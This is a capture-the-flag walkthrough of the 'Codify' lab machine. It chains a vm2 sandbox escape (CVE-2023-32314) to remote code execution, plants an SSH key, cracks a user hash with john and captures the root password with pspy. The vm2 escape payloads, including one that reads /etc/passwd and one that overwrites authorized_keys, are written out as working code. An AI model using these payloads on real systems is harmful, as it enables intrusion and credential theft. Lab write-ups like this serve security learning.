# Recon:

##### NMAP:

```
sudo nmap -sVC -p 22,3000,80 10.10.11.239
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open http Apache/2.4.52 (Ubuntu)
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open ppp?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### WHATWEB:

[http://codify.htb/](http://codify.htb/) [200 OK] Apache[2.4.52], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.239], Title[Codify], X-Powered-By[Express]



#### Message of the website:

```
# About Us

At Codify, our mission is to make it easy for developers to test their Node.js code. We understand that testing your code can be time-consuming and difficult, which is why we built this platform to simplify the process.

Our team is made up of experienced developers who are passionate about creating tools that make development easier. We're committed to providing a reliable and secure platform that you can trust to test your code.

Thank you for using Codify, and we hope that our platform helps you develop better Node.js applications.

## About Our Code Editor

Our code editor is a powerful tool that allows developers to write and test Node.js code in a user-friendly environment. You can write and run your JavaScript code directly in the browser, making it easy to experiment and debug your applications.

The [vm2](https://github.com/patriksimek/vm2/releases/tag/3.9.16) library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.
```


I didn't search the launchpad, but I was in presence of a linux distribution with an apache server and this server interprets node.js language, because it uses a framework called express.


With a quick search, the vulnerability resides on the library vm2 the CVE-2023-32314 permites me to do RCE on the website

[https://www.uptycs.com/blog/exploitable-vm2-vulnerabilities#:~:text=This%20vm2%20vulnerability%20is%20related,vm2%20versions%20up%20to%203.9](https://www.uptycs.com/blog/exploitable-vm2-vulnerabilities#:~:text=This%20vm2%20vulnerability%20is%20related,vm2%20versions%20up%20to%203.9)[.](https://www.uptycs.com/blog/exploitable-vm2-vulnerabilities#:~:text=This%20vm2%20vulnerability%20is%20related,vm2%20versions%20up%20to%203.9.)

With this simple POC I was able to execute commands:
```
const { VM } = require("vm2"); const vm = new VM() ; const code = ` const err= new Error(); err.name = { toString: new Proxy(() => "", { apply(target,thiz,args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("cat /etc/passwd").toString(); }, }), }; try { err.stack; } catch (stdout) { stdout; } `; console.log(vm.run(code)); // -> hacked
```

This machine has the port 22 opened, so I changed the `authorized_keys` content for my own id_rsa.pub

This was the payload:

```
const { VM } = require("vm2"); const vm = new VM() ; const code = ` const err= new Error(); err.name = { toString: new Proxy(() => "", { apply(target,thiz,args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgFH7JPdI+Kxzg8n2YfJY3laUSKMFdOBf7nrYZj3utkdaWKqfen6DNjUyYqxnGKfUBhIjspi8DF8x6T6EHWj4V9LxDrC+fzegbmLcINj1hqhJoXBMDyasdgIxE3WAu6/VASvpW3x86FvjOXM9/tKQSVazasyrpGq6nt475GbL8BAGsq7wvQP/EmnF2B0s3rQAKWR9RSDKzLRlSpgO6PzczOuwe020Ah/Dcf0zuHjL9DS8vVeLHHl+bBRTHGJPQ0aKzErlLYK0zSqOJU0frQ0AAwmnsfGf95lvUwIj8Tyuzp9j4rsQ+gQ3J8mdDE/MDJlJ+c3Q3BLcPDWvhmTkbSGNHCkf3PXiUUItpLKkyY3XM2NJOVmn4XWnHDrdms2ZdygSB6z4OdefP3sKz40wEieVZ8SOrO6OlHU2527P+sBH39D0oFAXn3v3quNSdOT3B98sX/tAovoiid95gz+GcP1nBVkZOwfpgW7nYEUvjVuXrAbKt6FgwMIaFASikOubQjzyNkklEkk1T0H/C8=" > .ssh/authorized_keys ').toString(); }, }), }; try { err.stack; } catch (stdout) { stdout; } `; console.log(vm.run(code)); // -> hacked
```

Then I get inside of the machine with my own key

`ssh -i id_rsa -l svc 10.10.11.239`


# User:

I was in presence of a 22.04.3 Ubuntu
```
lsb_release -a

No LSB modules are available.
Distributor ID: Ubuntu
Description: Ubuntu 22.04.3 LTS
Release: 22.04
Codename: jammy

uname -r
5.15.0-88-generic
```

The next step on this machine was become "joshua" to continue my privilege scalation. On the codify website, there was a message about that they were migrating his "ticket" db sistem. So I went to the root folder of the website to see whether I was able to retrieve something. 

I was able to find a hash `joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2` on this file `cat /var/www/contact/tickets.db`

I cracked It using john the ripper, but I edited the hash.txt so the hash looked like this:
`$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`

`john -w:/usr/share/wordlists/rockyou.txt hash.txt`

With `su joshua` I used the password and I become that user.
# Root


Here as Joshua I used sudo -l .  I see that I can use a script called `mysql-backup.sh` as root

```
sudo -l

[sudo] password for joshua:

Matching Defaults entries for joshua on codify:

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:

(root) /opt/scripts/mysql-backup.sh
```

This is the code of this binary

```
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```



So when I used `sudo /opt/scripts/mysql-backup.sh` it asked me for a password, it can be bypased with a special character `*`

The next step, was watch with pspy the process of the machine , I had to transfer it to the tmp folder and execute it. The idea is see the root pasword on plaintext on the process runing when I execute the script.

Now I needed two ssh connections as joshua, one executing the script , and the second one to listen on pspy.

When I did it , with pspy I watched this :

```
/usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -p<PASSWORD>
```

The next step was just use `su -` , put the root password and cat the root flag













